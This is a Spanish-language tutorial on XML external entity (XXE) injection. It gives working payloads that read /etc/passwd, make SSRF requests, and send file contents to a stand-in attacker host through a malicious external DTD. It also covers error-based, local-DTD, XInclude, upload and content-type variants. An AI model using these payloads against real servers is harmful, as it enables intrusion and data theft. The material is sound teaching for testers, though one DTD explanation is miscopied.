---
title: XXE Injection
date: 2023-04-25
categories: [Vulnerabilities, Web]
tags: [xxe, vulnerabilities, code_injection, web]
comments: false
---

La inyección de entidad externa XML, o "XML external entity injection" en inglés, es una vulnerabilidad de seguridad web que permite que interferimos con el procesamiento de datos XML de una aplicación. Normalmente, permite que podamos ver archivos en el sistema de archivos del servidor de aplicaciones e interactuar con cualquier sistema externo o de back-end al que la aplicación pueda acceder.

En algunas ocasiones, podemos escalar un ataque XXE para comprometer el servidor u otra infraestructura de back-end, aprovechando la vulnerabilidad XXE para realizar ataques SSRF.

## ¿Cómo surgen las vulnerabilidades XXE?
Algunas aplicacion utilizan XML para transmitir datos entre el navegador y el servidor. Las aplicaciones que hacen esto casi siempre usan una API de plataforma o librería estándar para procesar los datos XML en el servidor. Las vulnerabilidades XXE surgen porque la especificación XML contiene varias funciones potencialmente peligrosas y los analizadores estándar admiten estas funciones incluso si la aplicación no las usa normalmente.

Las entidades externas XML son un tipo de entidad XML personalizada cuyos valores definidos se cargan desde fuera de la DTD en la que se declara. Las entidades externas son particularmente interesantes desde una perspectiva de seguridad porque permiten definir una entidad en función del contenido de una ruta de archivo o URL.

## ¿Cuáles son los tipos de ataques XXE?
Existen varios tipos de ataques XXE, como:
- Explotación de XXE para recuperar archivos, donde se define una entidad externa que contiene el contenido de un archivo y se devuelve en la respuesta de la aplicación.
- Explotación de XXE para realizar ataques SSRF, donde una entidad externa se define en función de una URL a un sistema de back-end.
- Explotación de datos de exfiltración ciegos XXE fuera de banda, donde los datos confidenciales se transmiten desde el servidor de aplicación a un sistema que controlemos.
- Explotar XXE ciego para recuperar datos a través de mensajes de error, donde podemos activar un mensaje de error de análisis que contiene datos confidenciales.

## Explotando XXE para recuperar archivos
Para realizar un ataque de inyección XXE para recuperar archivos del sistema del servidor, se debe modificar el XML enviado de dos maneras:
- Introduciendo o editando un elemento "DOCTYPE" que defina una entidad externa que contenga la ruta del archivo.
- Editar un valor de datos en el XML que se devuelve en la respuesta de la aplicación, para hacer uso de la entidad externa definida.

Por ejemplo, supongamos que una aplicación de compras comprueba el nivel de existencias de un producto enviando el siguiente XML al servidor:
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```
La aplicación no realiza defensas particulares contra los ataques XXE, por lo que podemos aprovechar la vulnerabilidad XXE para recuperar el archivo "/etc/passwd" enviando el siguiente payload XXE:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
Este payload XXE defina una entidad externa "&xxe;" cuyo valor es el contenido del archivo "/etc/passwd" y utiliza la entidad dentro del valor de "productId". Esto hace que la respuesta de la aplicación incluya el contenido del archivo.

## Explotación de XXE para realizar ataques SSRF
Además de la recuperación de datos, estos ataques podemos utilizarlos para realizar una falsificación de solicitudes del lado del servidor (SSRF). Esta vulnerabilidad es potencialmente grave en la que podemos inducir a la aplicación a realizar solicitudes HTTP a cualquier URL a la que el servidor pueda acceder.

Para explotar XXE realizando un ataque SSRF, deberemos definir una entidad XML externa utilizando la URL a la que deseamos dirigirnos y utilizar la entidad definida dentro de un valor de datos. Si podemos usar la entidad definida dentro de un valor de datos que se devuelve en la respuesta de la aplicación, podremos ver la respuesta desde la URL dentro de la respuesta de la aplicación y, por lo tanto, obtener una interacción con el sistema de back-end. De lo contrario, solo podremos realizar ataques SSRF ciegos.

En el siguiente ejemplo XXE, la entidad externa hará que el servidor realice una solicitud HTTP de back-end a un sistema interno dentro de la infraestructura de la organización:
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
```

## Vulnerabilidades XXE ciegas
Muchas instancias de esta vulnerabilidad son ciegas. Esto significa que la aplicación no devuelve valores de ninguna entidad externa definida en sus respuestas, por lo que no es posible la recuperación de archivos del servidor.

Estas se pueden detectar y explotar, pero se requieren técnicas más avanzadas. A veces, podemos usar las técnicas OOB para encontrar vulnerabilidades y explotarlas para filtrar datos. Y a veces podemos desencadenar errores de análisis de XML que conducen a la divulgación de datos confidenciales dentro de los mensajes de error.

### Detectando vulnerabilidades XXE ciegas fuera de banda (OAST)
A menudo, podemos detectar XXE ciegos utilizando la misma técnica que para los ataques XXE SSRF pero activando la interacción de red fuera de banda con un sistema que controlamos. Por ejemplo, definiendo una entidad externa de la siguiente manera:
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```
Luego haríamos uso de la entidad definida en un valor de datos dentro del XML.

Este ataque XXE hace que el servidor realice una solicitud HTTP de back-end a la URL especificada. Podemos monitorizar la búsqueda DNS resultante y la solicitud HTTP y, por lo tanto, detectar que el ataque XXE fue exitoso.

A veces, los ataques XXE que utilizan entidades normales se bloquean debido a algunas validaciones de entrada por parte de la aplicación o algún endurecimiento del analizador XML que se está utilizando. En esta situación, es posible que podamos utilizar entidades de parámetros XML en su lugar. Las entidades de parámetros XML son un tipo especial de entidad XML a la que solo podemos hacer referencia en otro lugar dentro de la DTD. Para los propósitos presentes, solo necesitamos saber dos cosas. Primero, la declaración de una entidad de un parámetro XML incluye el carácter de porcentaje antes del nombre de la entidad:
```
<!ENTITY % myparameterentity "my parameter entity value" >
```
Y en segundo lugar, se hace referencia a las entidades de parámetros utilizando el carácter de porcentaje en lugar del ampersand habitual:
```
%myparameterentity;
```
Esto significa que podemos realizar una prueba de XXE ciego mediante la detección fuera de banda a través de entidades de parámetros XML de la siguiente manera:
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```
Este payload XXE declara una entidad del parámetro de llamada XML "xxe" y luego usa la entidad dentro de la DTD. Esto provocará una búsqueda de DNS y una solicitud HTTP al dominio del atacante, verificando que el ataque fue exitoso.

### Explotación de XXE ciego para filtrar datos fuera de banda
La detección de una vulnerabilidad XXE ciega a través de técnicas de fuera de banda está muy bien, pero en realidad no demuestra cómo se podría explotar la vulnerabilidad. Lo que un atacante realmente quiere lograr es filtrar datos confidenciales. Esto se puede lograr a través de una vulnerabilidad ciega XXE, pero implica que alojamos una DTD maliciosa en un sistema que controlemos y luego invocar la DRD externa desde dentro del payload XXE en banda.

Un ejemplo de un DTD malicioso para exfiltrar el contenido del archivo "/etc/passwd" podría ser el siguiente:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

Esta DTD lleva a cabo lo siguiente:
- Define una entidad de parámetro de llamada XML "file", que contiene el contenido del archivo "/etc/passwd".
- Define una entidad de parámetro de llamada XML "eval", que contiene una declaración dinámica de otra entidad de parámetro de llamada XML "exfiltrate". La entidad "exfiltrate" se evaluará realizando una solicitud HTTP a nuestro servidor web que contiene el valor de la entidad "file" dentro de la cadena de consulta de URL.
- Utiliza la entidad, lo que hace que se realice la declaración dinámica "eval" de la entidad "exfiltrate".
- Utiliza la entidad "exfiltrate", por lo que su valor se evalúa solicitando la URL especificada.

Luego, debemos alojar el DTD malicioso en un sistema que controlemos, normalmente cargando en nuestro propio servidor web. Por ejemplo, podremos entregar la DTD maliciosa en la siguiente URL:
```
http://web-attacker.com/malicious.dtd
```
Finalmente, debemos enviar el siguiente payload XXE a la aplicación vulnerable:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"http://web-attacker.com/malicious.dtd"> %xxe;]>
```
Este payload XXE declara una entidad de parámetro de llamada XML y luego usa la entidad dentro de la DTD. Esto hará que el analizador XML obtenga la DTD externa del servidor del atacante y la intérprete en línea. A continuación, se ejecutan los pasos definidos en la DTD maliciosa y el archivo "/etc/passwd" se transmite a nuestro servidor.

### Explotación de XXE ciego para recuperar datos a través de mensajes de error
Un enfoque alternativo para explotar XXE ciego es desencadenar un error de análisis XML donde el mensaje de error contiene los datos confidenciales que desea recuperar. Esto será efectivo si la aplicación devuelve el mensaje de error resultante dentro de la respuesta.

Puede desencadenar un mensaje de error de análisis XML que contengan el contenido del archivo "/etc/passwd" utilizando una DTD externa malintencionada de la siguiente manera:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

Esta DTD lleva a cabo lo siguiente:
- Define una entidad de parámetro de llamada XML "file", que contiene el contenido del archivo "/etc/passwd".
- Define una entidad de parámetro de llamada XML "eval", que contiene una declaración dinámica de otra entidad de parámetro de llamada XML "error". La entidad "error" se evaluará realizando una solicitud HTTP a nuestro servidor web que contiene el valor de la entidad "file" dentro de la cadena de consulta de URL.
- Utiliza la entidad, lo que hace que se realice la declaración dinámica "eval" de la entidad "error".
- Utiliza la entidad "error" para que su valor al intentar cargar el archivo inexistente, lo que genera un mensaje de error que contiene el nombre del archivo inexistente, que es el contenido del archivo "/etc/passwd".
La invocación de la DTD externa maliciosa dará como resultado un mensaje de error como el siguiente:
```
java.io.FileNotFoundException: /nonexistent/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

### Explotación de XXE ciego mediante la reutilización de una DTD local
La técnica anterior funciona bien con una DTD externa, pero normalmente no funcionará con una DTD interna que esté completamente especificada dentro del elemento "DOCTYPE". Esto se debe a que la técnica implica el uso de una entidad de parámetro XML dentro de la definición de otra entidad de parámetro. Según la especificación XML, esto está permitido en las DTD externas, pero no en las DTD internas.

En esta situación, aún sería posible generar mensajes de error que contengan datos confidenciales, debido a una laguna en la especificación del lenguaje XML. Si la DTD de un documento utiliza un híbrido de declaraciones DTD internas y externas, la DTD interna puede definir las entidades que se declaran en la DTD externa. Cuando esto sucede, se relaja la restricción sobre el uso de una entidad de parámetro XML dentro de la definición de otra entidad de parámetro.

Esto significa que podemos emplear la técnica XXE basada en errores desde dentro de una DTD interna, siempre que la entidad de parámetro XML que utilicemos redefine una identidad declarada dentro de una DTD externa. Por supuesto, si las conexiones fuera de banda están bloqueadas, la DTD externa no se puede cargar desde una ubicación remota. En su lugar, debe ser un archivo DRD que existe en el sistema de archivos local y utilizarlo para redefinir una entidad existente de una manera que desencadena un error de análisis que contiene datos confidenciales.

Por ejemplo, supongamos que hay un archivo DTD en el sistema de archivos del servidor en la ubicación "/usr/local/app/schema.dtd" y este archivo DTD define una entidad llamada "custom_entity". Podemos desencadenar un mensaje de error de análisis XML que contenga el contenido del archivo "/etc/passwd" al enviar una DTD híbrida como la siguiente:
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

Esta DTD lleva a cabo lo siguiente:
- Define una entidad de parámetro de llamada XML "local_dtd", que contiene el contenido del archivo DTD que existe en el sistema de archivos del servidor.
- Redefine la entidad de parámetro de llamada XML "custom_entity", que ya está definida en el archivo DTD externos. La entidad se redefine para contener el exploit XXE basado en errores que ya se describió, para activar un mensaje de error que contiene el contenido del archivo "/etc/passwd".
- Utiliza la entidad "local_dtd", para que se interprete la DTD externa, incluyendo el valor predefinido de la entidad "custom_entity". Esto da como resultado el mensaje de error deseado.

### Localización de un archivo DTD existente para reutilizar
Dado que este ataque XXE implica la reutilización de una DTD existente en el sistema de archivos del servidor, un requisito clave es ubicar un archivo adecuado. En realidad, esto es bastante sencillo. Debido a que la aplicación devuelve cualquier mensaje de error generado por el analizador XML, puede enumerar fácilmente los archivos DTD locales simplemente intentando cargarlos desde la DTD interna.

Por ejemplo, los sistemas Linux que utilizan el entorno de escritorio GNOME suelen tener un archivo DTD en "/usr/share/yelp/dtd/docbookx.dtd". Podemos probar si este archivo está presente enviando el siguiente payload XXE, que provocará un error si falta el archivo:
```
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Después de haber probado una lista de archivos DTD comunes para localizar un archivo presente, deberemos obtener una copia del archivo y revisarlo para encontrar una entidad que podamos redefinir. Dado que muchos sistemas comunes que contienen archivos DTD son de código abierto, normalmente podemos obtener una copia de los archivos a través de una búsqueda por internet.

## Encontrar una superficie de ataque para la inyección XXE
En muchos casos es obvia, porque el tráfico HTTP normal de la aplicación incluye solicitudes que contienen datos en formato XML. En otros casos, es menos visible. Sin embargo, si buscamos en los lugares correctos, podemos encontrarlas en solicitudes que no contienen ningún XML.

### Ataques XInclude
Algunas aplicaciones reciben datos enviados por el cliente, los incrustan en el lado del servidor en un documento XML y luego analizan el documento. Un ejemplo de esto ocurre cuando los datos enviados por el cliente se colocan en una solicitud SOAP de back-end, que luego es procesada por el servicio SOAP de back-end.

En esta situación, no podemos realizar un ataque XXE clásico, porque no controlamos todo el documento XML y, por lo tanto, no podemos definir ni modificar un elemento "DOCTYPE". Sin embargo, podemos usar "XInclude" en su lugar. XInclude es una parte de la especificación XML que permite crear documentos XML a partir de subdocumentos. Podemos colocar un ataque XInclude dentro de cualquier valor de datos en un documento XML, por lo que el ataque se puede realizar en situaciones en las que solo controlamos un único elemento de datos que se coloca en un documento XML del lado del servidor.

Para realizar un ataque XInclude, deberemos hacer referencia al namespace XInclude y proporcionar la ruta al archivo que deseamos incluir. Por ejemplo:
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### Ataques XXE a través de la carga de archivos
Algunas aplicaciones permiten a los usuarios cargar archivos que luego se procesan en el servidor. Algunos formatos de archivos comunes usan XML o contienen subcomponentes XML. Ejemplos de formatos en XML son formatos de documentos de oficina como DOCX y formatos de imagen como SVG.

Por ejemplo, una aplicación podría permitir a los usuarios cargar imágenes y procesarlas o validarlas en el servidor después de cargarlas. Incluso si la aplicación espera recibir un formato como PNG o JPEG, la biblioteca de procesamiento de imágenes que se utiliza puede admitir imágenes SVG. Dado que el formato usa XML, un atacante puede enviar una imagen SVG maliciosa y así alcanzar la superficie de ataque oculta para las vulnerabilidades XXE.

### Ataques XXE a través del tipo de contenido modificado
La mayoría de solicitudes POST utilizan un tipo de contenido predeterminado generado por formularios HTML, como "application/x-www-form-urlencoded". Algunos sitios web esperan recibir solicitudes en este formato, pero tolerarán otros tipos de contenido, incluido XML.

Por ejemplo, si una solicitud normal contiene lo siguiente:
```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Entonces es posible que podamos enviar la siguiente solicitud, con el mismo resultado:
```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
Si la aplicación tolera solicitudes que contienen XML en el cuerpo del mensaje y analiza el contenido del cuerpo como XML, entonces puede llegar a la superficie de ataque XXE oculta simplemente las solicitudes para usar el formato XML.

## Cómo encontrar y probar vulnerabilidades XXE
La mayoría de vulnerabilidades XXE se pueden encontrar de manera rápida y confiable utilizando el escáner de vulnerabilidades web de BurpSuite.

La prueba manual de vulnerabilidades XXE generalmente implica:
- Probar la recuperación de archivos mediante la definición de una entidad externa basada en un archivo de sistema operativo conocido y el uso de esa entidad en los datos que se devuelven en la respuesta de la aplicación.
- Probar vulnerabilidades XXE ciegas definiendo una entidad externa basada en una URL a un sistema que podamos controlar y monitorizar las interacciones con ese sistema.
- Prueba de inclusión vulnerable de datos no XML proporcionados por el usuario dentro de un documento XML del lado del servidor mediante un ataque XInclude para intentar recuperar un archivo de sistema operativo conocido.
